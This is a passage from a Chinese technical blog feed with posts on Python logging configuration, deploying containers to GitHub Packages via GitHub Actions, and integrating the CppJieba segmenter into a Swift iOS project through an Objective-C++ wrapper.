然后，你可以为每个记录器，处理程序和格式化程序设置属性。 在下面的示例中，将使用 StreamHandler 配置根记录器和名为 <em>simpleExample</em> 的记录器。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># logging.conf</span></span><br><span class="line">[loggers]</span><br><span class="line">keys=root,simpleExample</span><br><span class="line"></span><br><span class="line">[handlers]</span><br><span class="line">keys=consoleHandler</span><br><span class="line"></span><br><span class="line">[formatters]</span><br><span class="line">keys=simpleFormatter</span><br><span class="line"></span><br><span class="line">[logger_root]</span><br><span class="line">level=DEBUG</span><br><span class="line">handlers=consoleHandler</span><br><span class="line"></span><br><span class="line">[logger_simpleExample]</span><br><span class="line">level=DEBUG</span><br><span class="line">handlers=consoleHandler</span><br><span class="line">qualname=simpleExample</span><br><span class="line">propagate=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">[handler_consoleHandler]</span><br><span class="line"><span class="keyword">class</span>=StreamHandler</span><br><span class="line">level=DEBUG</span><br><span class="line">formatter=simpleFormatter</span><br><span class="line">args=(sys.stdout,)</span><br><span class="line"></span><br><span class="line">[formatter_simpleFormatter]</span><br><span class="line"><span class="built_in">format</span>=%(asctime)s - %(name)s - %(levelname)s - %(message)s</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在代码中使用配置文件</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> logging.config</span><br><span class="line"></span><br><span class="line">logging.config.fileConfig(<span class="string">&#x27;logging.conf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用配置文件中的名称创建记录器。</span></span><br><span class="line"><span class="comment"># 该记录器现在具有带有 DEBUG 级别和指定格式的 StreamHandler</span></span><br><span class="line">logger = logging.getLogger(<span class="string">&#x27;simpleExample&#x27;</span>)</span><br><span class="line"></span><br><span class="line">logger.debug(<span class="string">&#x27;debug message&#x27;</span>)</span><br><span class="line">logger.info(<span class="string">&#x27;info message&#x27;</span>)</span><br></pre></td></tr></table></figure><h2><span id="bu-huo-dui-zhan-gen-zong">捕获堆栈跟踪</span></h2><p>将跟踪记录记录在异常日志中对于解决问题非常有用。 你可以通过将 <em>excinfo</em> 参数设置为True来捕获 <code>logging.error()</code> 中的回溯。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">    value = a[<span class="number">3</span>]</span><br><span class="line"><span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">    logging.error(e)</span><br><span class="line">    logging.error(e, exc_info=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ERROR:root:<span class="built_in">list</span> index out of <span class="built_in">range</span></span><br><span class="line">ERROR:root:<span class="built_in">list</span> index out of <span class="built_in">range</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;ipython-input-6-df97a133cbe6&gt;&quot;</span>, line <span class="number">5</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    value = a[<span class="number">3</span>]</span><br><span class="line">IndexError: <span class="built_in">list</span> index out of <span class="built_in">range</span></span><br></pre></td></tr></table></figure><p>如果未捕获正确的 Exception，则还可以使用 <em>traceback.formatexc()</em> 方法记录该异常。</p><h2><span id="gun-dong-filehandler">滚动 FileHandler</span></h2><p>当你有一个大型应用程序将许多事件记录到一个文件中，而你只需要跟踪最近的事件时，请使用RotatingFileHandler来使文件保持较小。 当日志达到一定数量的字节时，它将被“滚动”。 你还可以保留多个备份日志文件，然后再覆盖它们。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> logging.handlers <span class="keyword">import</span> RotatingFileHandler</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line">logger.setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2KB后滚动，并保留备份日志为 app.log.1, app.log.2 等.</span></span><br><span class="line">handler = RotatingFileHandler(<span class="string">&#x27;app.log&#x27;</span>, maxBytes=<span class="number">2000</span>, backupCount=<span class="number">5</span>)</span><br><span class="line">logger.addHandler(handler)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    logger.info(<span class="string">&#x27;Hello, world!&#x27;</span>)</span><br></pre></td></tr></table></figure><h2><span id="timedrotatingfilehandler">TimedRotatingFileHandler</span></h2><p>如果你的应用程序将长时间运行，则可以使用 TimedRotatingFileHandler。 这将根据经过的时间创建一个轮换日志。 <em>when</em> 参数的可能时间条件是：</p><ul><li>second (s)</li><li>minute (m)</li><li>hour (h)</li><li>day (d)</li><li>w0-w6 (工作日, 0=星期一)</li><li>midnight</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> logging.handlers <span class="keyword">import</span> TimedRotatingFileHandler</span><br><span class="line"> </span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line">logger.setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这将每分钟创建一个新的日志文件，并在覆盖旧日志之前创建一个带有时间戳的5个备份文件。</span></span><br><span class="line">handler = TimedRotatingFileHandler(<span class="string">&#x27;timed_test.log&#x27;</span>, when=<span class="string">&#x27;m&#x27;</span>, interval=<span class="number">1</span>, backupCount=<span class="number">5</span>)</span><br><span class="line">logger.addHandler(handler)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    logger.info(<span class="string">&#x27;Hello, world!&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">50</span>)</span><br></pre></td></tr></table></figure><h2><span id="yi-json-ge-shi-deng-lu">以JSON格式登录</span></h2><p>如果你的应用程序从不同的模块（特别是在微服务体系结构中）生成许多日志，那么定位重要的日志以进行分析可能会很困难。 因此，最佳实践是以JSON格式记录你的消息，并将其发送到集中式日志管理系统。 然后，你可以轻松地搜索，可视化和分析日志记录。</p><p>我建议使用此开源JSON记录器：<a href="https://github.com/madzak/python-json-logger">https://github.com/madzak/python-json-logger</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install python-json-logger</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> pythonjsonlogger <span class="keyword">import</span> jsonlogger</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger()</span><br><span class="line"></span><br><span class="line">logHandler = logging.StreamHandler()</span><br><span class="line">formatter = jsonlogger.JsonFormatter()</span><br><span class="line">logHandler.setFormatter(formatter)</span><br><span class="line">logger.addHandler(logHandler)</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      10. 日志记录 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第9天：部署到GitHub Packages</title>
    <link href="https://qiwihui.com/qiwihui-blog-92/"/>
    <id>https://qiwihui.com/qiwihui-blog-92/</id>
    <published>2022-08-13T01:54:25.650Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>本月到目前为止，我们已经研究了许多执行构建并运行一些测试的方案。这些都是很棒的工作流程──它们确保进入你的项目的pull request是高质量的，并且你的主分支是健康的。</p><p>但是，你通常想采取下一步并部署自己构建的内容。例如，你可能想构建一个容器，并在每次新的主分支合入新功能时将其上传到<a href="https://github.com/features/packages">GitHub Packages</a>。这将确保你有一个可以运行并验证每个更改的容器。</p><p>为此，我们要触发向master的推送。（无论是从 <code>git push</code> 还是从合并pull request，只要<a href="https://www.edwardthomson.com/blog/github_actions_1_cicd_triggers.html">集成到master</a>中，<code>push</code> 触发器都将运行。）</p><p>然后，我们将从docker登录到GitHub Packages。我们可以简单地使用GitHub Actions提供给我们的 <code>GITHUB_TOKEN</code>──令牌对我们存储库中的软件包具有发布权限。</p><span id="more"></span><p>然后，我们将构建容器，并使用包注册的名称对其进行标记（在本例中是 <code>docker.pkg.github.com</code> 其后为容器的名称 <code>ethomson/myrepo/app</code>），并为其指定版本号，即Unix时间。</p><p>最后，我们<a href="https://gist.github.com/ethomson/60e664ef09051cea66dada5d53c62e6d">将容器推送到GitHub Packages</a>。</p><script src="https://gist.github.com/ethomson/60e664ef09051cea66dada5d53c62e6d.js"></script><p>现在，我有一个简单的连续部署系统，该系统将始终使用包含来自master分支的最新版本的容器来更新GitHub Packages。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_9_deploy_to_github_packages.html">https://www.edwardthomson.com/blog/github_actions_9_deploy_to_github_packages.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第9天：部署到GitHub Packages
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>在iOS-Swift项目中集成CppJieba分词</title>
    <link href="https://qiwihui.com/qiwihui-blog-45/"/>
    <id>https://qiwihui.com/qiwihui-blog-45/</id>
    <published>2022-08-13T01:54:25.640Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>在垃圾短信过滤应用 <code>SMSFilters</code> 中，需要使用 <code>Jieba</code> 分词库来対短信进行分词，然后使用 <code>TF-IDF</code> 来进行处理` 分词库是 C++ 写的，这就意味着需要在Swift中集成 C++ 库。在官方文档 “<a href="https://developer.apple.com/library/prerelease/ios/documentation/Swift/Conceptual/BuildingCocoaApps/index.html">Using Swift with Cocoa and Objective-C</a>” 中，Apple只是介绍了怎么将 Swift 代码跟 Objective-C 代码做整合，但是没有提C++，后来在官方文档中看到了这样一段话：</p><blockquote><p>You cannot import C++ code directly into Swift. Instead, create an Objective-C or C wrapper for C++ code.</p></blockquote><p>也就是不能直接导入 C++ 代码，但是可以使用 Objective-C 或者 C 对 C++ 进行封装。所以项目中使用 Objective-C 做封装，然后在 Swift 中调用，下面就是这个过程的实践，Demo 代码见 <a href="https://github.com/qiwihui/SwiftJiebaDemo">SwiftJiebaDemo</a>。</p><span id="more"></span><h2><span id="zheng-he-guo-cheng">整合过程</span></h2><p>分成三步：</p><ol><li>引入C++文件；</li><li>用 Objective-C 封装；</li><li>在 Swift 中 调用 Objective-C；</li></ol><h3><span id="yin-ru-c-wen-jian">引入C++文件</span></h3><p>Demo中使用的是&quot;结巴&quot;中文分词的 C++ 版本 <a href="https://github.com/yanyiwu/cppjieba">yanyiwu/cppjieba</a>。将其中的 <code>include/cppjieba</code> 和依赖 <code>limonp</code> 合并，并加入 <code>dict</code> 中的 <code>hmm_model</code> 和 <code>jiaba.dict</code> 作为基础数据，并暴露 <code>JiebaInit</code> 和  <code>JiebaCut</code> 接口：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Segmentor.cpp</span></span><br><span class="line"><span class="comment">//  iosjieba</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by yanyiwu on 14/12/24.</span></span><br><span class="line"><span class="comment">//  Copyright (c) 2014年 yanyiwu. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Segmentor.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> cppjieba;</span><br><span class="line"></span><br><span class="line">cppjieba::MixSegment * globalSegmentor;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">JiebaInit</span><span class="params">(<span class="type">const</span> string&amp; dictPath, <span class="type">const</span> string&amp; hmmPath, <span class="type">const</span> string&amp; userDictPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(globalSegmentor == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        globalSegmentor = <span class="keyword">new</span> <span class="built_in">MixSegment</span>(dictPath, hmmPath, userDictPath);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; __FILE__ &lt;&lt; __LINE__ &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">JiebaCut</span><span class="params">(<span class="type">const</span> string&amp; sentence, vector&lt;string&gt;&amp; words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(globalSegmentor);</span><br><span class="line">    globalSegmentor-&gt;<span class="built_in">Cut</span>(sentence, words);</span><br><span class="line">    cout &lt;&lt; __FILE__ &lt;&lt; __LINE__ &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; words &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Segmentor.h</span></span><br><span class="line"><span class="comment">//  iosjieba</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by yanyiwu on 14/12/24.</span></span><br><span class="line"><span class="comment">//  Copyright (c) 2014年 yanyiwu. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __iosjieba__Segmentor__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __iosjieba__Segmentor__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cppjieba/MixSegment.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> cppjieba::MixSegment * globalSegmentor;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">JiebaInit</span><span class="params">(<span class="type">const</span> std::string&amp; dictPath, <span class="type">const</span> std::string&amp; hmmPath, <span class="type">const</span> std::string&amp; userDictPath)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">JiebaCut</span><span class="params">(<span class="type">const</span> std::string&amp; sentence, std::vector&lt;std::string&gt;&amp; words)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* defined(__iosjieba__Segmentor__) */</span></span></span><br></pre></td></tr></table></figure><p>目录如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tree iosjieba</span><br><span class="line">iosjieba</span><br><span class="line">├── Segmentor.cpp</span><br><span class="line">├── Segmentor.h</span><br><span class="line">├── cppjieba</span><br><span class="line">│   ├── DictTrie.hpp</span><br><span class="line">│   ├── FullSegment.hpp</span><br><span class="line">│   ├── HMMModel.hpp</span><br><span class="line">│   ├── HMMSegment.hpp</span><br><span class="line">│   ├── Jieba.hpp</span><br><span class="line">│   ├── KeywordExtractor.hpp</span><br><span class="line">│   ├── MPSegment.hpp</span><br><span class="line">│   ├── MixSegment.hpp</span><br><span class="line">│   ├── PosTagger.hpp</span><br><span class="line">│   ├── PreFilter.hpp</span><br><span class="line">│   ├── QuerySegment.hpp</span><br><span class="line">│   ├── SegmentBase.hpp</span><br><span class="line">│   ├── SegmentTagged.hpp</span><br><span class="line">│   ├── TextRankExtractor.hpp</span><br><span class="line">│   ├── Trie.hpp</span><br><span class="line">│   ├── Unicode.hpp</span><br><span class="line">│   └── limonp</span><br><span class="line">│       ├── ArgvContext.hpp</span><br><span class="line">│       ├── BlockingQueue.hpp</span><br><span class="line">│       ├── BoundedBlockingQueue.hpp</span><br><span class="line">│       ├── BoundedQueue.hpp</span><br><span class="line">│       ├── Closure.hpp</span><br><span class="line">│       ├── Colors.hpp</span><br><span class="line">│       ├── Condition.hpp</span><br><span class="line">│       ├── Config.hpp</span><br><span class="line">│       ├── FileLock.hpp</span><br><span class="line">│       ├── ForcePublic.hpp</span><br><span class="line">│       ├── LocalVector.hpp</span><br><span class="line">│       ├── Logging.hpp</span><br><span class="line">│       ├── Md5.hpp</span><br><span class="line">│       ├── MutexLock.hpp</span><br><span class="line">│       ├── NonCopyable.hpp</span><br><span class="line">│       ├── StdExtension.hpp</span><br><span class="line">│       ├── StringUtil.hpp</span><br><span class="line">│       ├── Thread.hpp</span><br><span class="line">│       └── ThreadPool.hpp</span><br><span class="line">└── iosjieba.bundle</span><br><span class="line">    └── dict</span><br><span class="line">        ├── hmm_model.utf8</span><br><span class="line">        ├── jieba.dict.small.utf8</span><br><span class="line">        └── user.dict.utf8</span><br></pre></td></tr></table></figure><p>接下来开始在项目中集成。首先创建一个空项目 <code>iOSJiebaDemo</code>，将 <code>iosjieba</code> 加入项目中。</p><table><thead><tr><th style="text-align:center">单页应用</th><th style="text-align:center">SwiftJiebaDemo</th><th style="text-align:center">添加 SwiftJiebaDemo</th></tr></thead><tbody><tr><td style="text-align:center"><img src="https://user-images.githubusercontent.com/3297411/51162445-26d16780-18d1-11e9-9385-123b8b64fbb9.png" alt="create-single-view-app"></td><td style="text-align:center"><img src="https://user-images.githubusercontent.com/3297411/51162258-8713d980-18d0-11e9-9c9e-ffec10c8d2dc.png" alt="swift-jieba-demo-1"></td><td style="text-align:center"><img src="https://user-images.githubusercontent.com/3297411/51162266-8f6c1480-18d0-11e9-922e-a5b728e85eb9.png" alt="swift-jieba-demo-2"></td></tr></tbody></table><p>添加 iosjieba:</p><p><img src="https://user-images.githubusercontent.com/3297411/51162030-ae1ddb80-18cf-11e9-8e2f-8692e2e7f915.png" alt="iosjieba-1"></p><p>见代码： <a href="https://github.com/qiwihui/SwiftJiebaDemo/commit/caeb6c2f9fb005a9bc518ee67890814481676807">https://github.com/qiwihui/SwiftJiebaDemo/commit/caeb6c2f9fb005a9bc518ee67890814481676807</a></p><h3><span id="c-dao-objective-c-feng-zhuang">C++ 到 Objective-C 封装</span></h3><p>这个过程是将 C++ 的接口进行 Objective-C 封装，向 Swift 暴露。这个封装只暴露了 <code>objcJiebaInit</code> 和 <code>objcJiebaCut</code> 两个接口。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//</span><br><span class="line">//  iosjiebaWrapper.h</span><br><span class="line">//  SMSFilters</span><br><span class="line">//</span><br><span class="line">//  Created by Qiwihui on 1/14/19.</span><br><span class="line">//  Copyright © 2019 qiwihui. All rights reserved.</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line"></span><br><span class="line">@interface JiebaWrapper : NSObject</span><br><span class="line"></span><br><span class="line">- (void) objcJiebaInit: (NSString *) dictPath forPath: (NSString *) hmmPath forDictPath: (NSString *) userDictPath;</span><br><span class="line">- (void) objcJiebaCut: (NSString *) sentence toWords: (NSMutableArray *) words;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//</span><br><span class="line">//  iosjiebaWrapper.mm</span><br><span class="line">//  iOSJiebaTest</span><br><span class="line">//</span><br><span class="line">//  Created by Qiwihui on 1/14/19.</span><br><span class="line">//  Copyright © 2019 Qiwihui. All rights reserved.</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line">#import &quot;iosjiebaWrapper.h&quot;</span><br><span class="line">#include &quot;Segmentor.h&quot;</span><br><span class="line"></span><br><span class="line">@implementation JiebaWrapper</span><br><span class="line"></span><br><span class="line">- (void) objcJiebaInit: (NSString *) dictPath forPath: (NSString *) hmmPath forDictPath: (NSString *) userDictPath &#123;</span><br><span class="line"></span><br><span class="line">    const char *cDictPath = [dictPath UTF8String];</span><br><span class="line">    const char *cHmmPath = [hmmPath UTF8String];</span><br><span class="line">    const char *cUserDictPath = [userDictPath UTF8String];</span><br><span class="line">    </span><br><span class="line">    JiebaInit(cDictPath, cHmmPath, cUserDictPath);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (void) objcJiebaCut: (NSString *) sentence toWords: (NSMutableArray *) words &#123;</span><br><span class="line">    </span><br><span class="line">    const char* cSentence = [sentence UTF8String];</span><br><span class="line">    </span><br><span class="line">    std::vector&lt;std::string&gt; wordsList;</span><br><span class="line">    for (int i = 0; i &lt; [words count];i++)</span><br><span class="line">    &#123;</span><br><span class="line">        wordsList.push_back(wordsList[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    JiebaCut(cSentence, wordsList);</span><br><span class="line">    </span><br><span class="line">    [words removeAllObjects];</span><br><span class="line">    std::for_each(wordsList.begin(), wordsList.end(), [&amp;words](std::string str) &#123;</span><br><span class="line">        id nsstr = [NSString stringWithUTF8String:str.c_str()];</span><br><span class="line">        [words addObject:nsstr];</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><p>见代码： <a href="https://github.com/qiwihui/SwiftJiebaDemo/commit/7d196bb2c33280a4f419be21b47961a521618221">https://github.com/qiwihui/SwiftJiebaDemo/commit/7d196bb2c33280a4f419be21b47961a521618221</a></p><h3><span id="objective-c-dao-swift">Objective-C 到 Swift</span></h3><p>在 Swift 中调用 Objecttive-C 的接口，这个在官方文档和许多博客中都有详细介绍。</p><ol><li>加入 <code>&#123;project_name&#125;-Bridging-Header.h</code> 头文件，即 <code>SwiftJiebaDemo_Bridging_Header_h</code>，引入之前封装的头文件，并在 <code>Targets -&gt; Build Settings -&gt; Objective-C Bridging Header</code> 中设置头文件路径 <code>SwiftJiebaDemo/SwiftJiebaDemo_Bridging_Header_h</code>。</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//</span><br><span class="line">//  SwiftJiebaDemo-Bridging-Header.h</span><br><span class="line">//  SwiftJiebaDemo</span><br><span class="line">//</span><br><span class="line">//  Created by Qiwihui on 1/15/19.</span><br><span class="line">//  Copyright © 2019 Qiwihui. All rights reserved.</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">#ifndef SwiftJiebaDemo_Bridging_Header_h</span><br><span class="line">#define SwiftJiebaDemo_Bridging_Header_h</span><br><span class="line"></span><br><span class="line">#import &quot;iosjiebaWrapper.h&quot;</span><br><span class="line"></span><br><span class="line">#endif /* SwiftJiebaDemo_Bridging_Header_h */</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/3297411/51162068-d60d3f00-18cf-11e9-951f-ec5c20e984dc.png" alt="bridging-header-2"></p><ol start="2"><li>将使用到 C++ 的 Objective-C 文件修改为 Objective-C++ 文件，即 将 <code>.m</code> 改为 <code>.mm</code>: <code>iosjiebaWrapper.m</code> 改为 <code>iosjiebaWrapper.mm</code>。</li></ol><p>见代码：<a href="https://github.com/qiwihui/SwiftJiebaDemo/commit/94852b1357b0a0a4b2e8b92384fbdb1b16c80ed8">https://github.com/qiwihui/SwiftJiebaDemo/commit/94852b1357b0a0a4b2e8b92384fbdb1b16c80ed8</a></p><h3><span id="shi-yong">使用</span></h3><p>使用时需要先初始化 <code>Jiaba</code>分词，然后再进行分词。</p><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Classifier</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">init</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> dictPath <span class="operator">=</span> <span class="type">Bundle</span>.main.resourcePath<span class="operator">!+</span><span class="string">&quot;/iosjieba.bundle/dict/jieba.dict.small.utf8&quot;</span></span><br><span class="line">        <span class="keyword">let</span> hmmPath <span class="operator">=</span> <span class="type">Bundle</span>.main.resourcePath<span class="operator">!+</span><span class="string">&quot;/iosjieba.bundle/dict/hmm_model.utf8&quot;</span></span><br><span class="line">        <span class="keyword">let</span> userDictPath <span class="operator">=</span> <span class="type">Bundle</span>.main.resourcePath<span class="operator">!+</span><span class="string">&quot;/iosjieba.bundle/dict/user.dict.utf8&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">JiebaWrapper</span>().objcJiebaInit(dictPath, forPath: hmmPath, forDictPath: userDictPath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">func</span> <span class="title function_">tokenize</span>(<span class="keyword">_</span> <span class="params">message</span>:<span class="type">String</span>) -&gt; [<span class="type">String</span>] &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;tokenize...&quot;</span>)</span><br><span class="line">        <span class="keyword">let</span> words <span class="operator">=</span> <span class="type">NSMutableArray</span>()</span><br><span class="line">        <span class="type">JiebaWrapper</span>().objcJiebaCut(message, toWords: words)</span><br><span class="line">        <span class="keyword">return</span> words <span class="keyword">as!</span> [<span class="type">String</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>控制台输出结果：</p><p><img src="https://user-images.githubusercontent.com/3297411/51162211-5a5fc200-18d0-11e9-9849-c86d2fbf683d.png" alt="result"></p><p>可以看到，测试用例 <code>小明硕士毕业于中国科学院计算所，后在日本京都大学深造</code> 经过分词后为<code>〔拼音〕[&quot;小明&quot;, &quot;硕士&quot;, &quot;毕业&quot;, &quot;于&quot;, &quot;中国科学院&quot;, &quot;计算所&quot;, &quot;，&quot;, &quot;后&quot;, &quot;在&quot;, &quot;日本&quot;, &quot;京都大学&quot;, &quot;深造&quot;]</code>，完成集成。</p><p>见代码： <a href="https://github.com/qiwihui/SwiftJiebaDemo/commit/bc42e1312dff6a9f7171cc69403136bc8a82204c">https://github.com/qiwihui/SwiftJiebaDemo/commit/bc42e1312dff6a9f7171cc69403136bc8a82204c</a></p><h2><span id="yu-dao-de-wen-ti">遇到的问题</span></h2><p>由于自己对于编译链接原理不了解，以及是 iOS 开发初学，因此上面的这个过程中遇到了很多问题，耗时两周才解决，故将遇到的一些问题记录于此，以便日后。</p><ol start="0"><li><code>&quot;cassert&quot; file not found</code></li></ol><p>将 <code>.m</code> 改为 <code>.mm</code> 即可。</p><ol><li><code>compiler not finding &lt;tr1/unordered_map&gt;</code></li></ol><p>设置 <code>C++ Standard Library</code> 为 <code>LLVM libc++</code></p><p><img src="https://user-images.githubusercontent.com/3297411/51225371-3f02be80-1985-11e9-9705-32de84b5dfad.png" alt="llvm"></p><p>参考： <a href="https://stackoverflow.com/questions/42030598/mac-c-compiler-not-finding-tr1-unordered-map">mac c++ compiler not finding &lt;tr1/unordered_map&gt;</a></p><ol start="2"><li><code>warning: include path for stdlibc++ headers not found; pass '-std=libc++' on the command line to use the libc++ standard library instead [-Wstdlibcxx-not-found]</code></li></ol><p><code>Build Setting -&gt; C++ Standard Library -&gt; libstdc++</code> 修改为 <code>Build Setting -&gt; C++ Standard Library -&gt; libc++</code></p><ol start="3"><li><code>use of unresolved identifier</code></li></ol><p>这个问题在于向项目中加入文件时，<code>Target Membership</code> 设置不正确导致。需要将对于使用到的 Target 都勾上。</p><p>相关参考： <a href="https://learnappmaking.com/unresolved-identifier-understanding-xcode/">Understanding The “Use of Unresolved Identifier” Error In Xcode</a></p><h2><span id="can-kao">参考</span></h2><ul><li><a href="https://stackoverflow.com/users/218152/swiftarchitect">SwiftArchitect</a> 对问题 “Can I have Swift, Objective-C, C and C++ files in the same Xcode project?” 的<a href="https://stackoverflow.com/a/32546879/3218128">回答</a></li><li><a href="https://stackoverflow.com/users/218152/swiftarchitect">SwiftArchitect</a> 对问题 “Can I mix Swift with C++? Like the Objective - C .mm files” 的<a href="https://stackoverflow.com/a/32554229/3218128">回答</a></li><li><a href="https://blog.voidmain.guru/2014/07/01/integrating-swift-with-c-plus-plus/">在Swift代码中整合C++类库</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      在iOS-Swift项目中集成CppJieba分词
    
    </summary>
    
